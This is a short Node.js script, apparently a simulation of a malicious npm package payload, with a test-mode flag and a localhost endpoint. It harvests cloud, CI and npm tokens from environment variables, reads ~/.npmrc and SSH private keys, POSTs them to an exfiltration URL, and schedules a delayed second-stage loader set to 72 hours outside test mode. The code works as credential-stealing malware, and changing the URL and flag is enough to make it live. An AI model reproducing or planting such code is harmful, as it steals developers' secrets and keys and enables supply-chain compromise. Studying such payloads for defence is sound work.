const SAFE_TEST_MODE = true;

const os = require("os");
const fs = require("fs");
const path = require("path");
const http = require("http");

const EXFIL_URL = "http://localhost:9999/exfil";

function stage1() {
  const stolen = {
    stage: 1,
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    env: {},
    tokens: {},
  };

  const sensitivePatterns =
    /NPM_TOKEN|npm_config|AWS_ACCESS|AWS_SECRET|GITHUB_TOKEN|GH_TOKEN|GITLAB|AZURE|DOCKER|CI_TOKEN/i;
  for (const [key, value] of Object.entries(process.env)) {
    if (sensitivePatterns.test(key)) {
      stolen.env[key] = value;
    }
  }

  const home = os.homedir();
  const tokenFiles = [
    path.join(home, ".npmrc"),
    path.join(home, ".ssh", "id_rsa"),
    path.join(home, ".ssh", "id_ed25519"),
  ];
  for (const filePath of tokenFiles) {
    try {
      stolen.tokens[path.basename(filePath)] = fs.readFileSync(
        filePath,
        "utf-8"
      );
    } catch (e) {

    }
  }

  exfil(stolen);

  scheduleStage2();
}

function exfil(data) {
  const payload = JSON.stringify(data);
  const url = new URL(EXFIL_URL);
  const req = http.request(
    {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload),
      },
    },
    () => {}
  );
  req.on("error", () => {});
  req.write(payload);
  req.end();
}

function scheduleStage2() {

  const delay = SAFE_TEST_MODE ? 5000 : 72 * 60 * 60 * 1000;

  setTimeout(() => {
    try {
      require("./lib/loader.js");
    } catch (e) {

    }
  }, delay);
}

stage1();
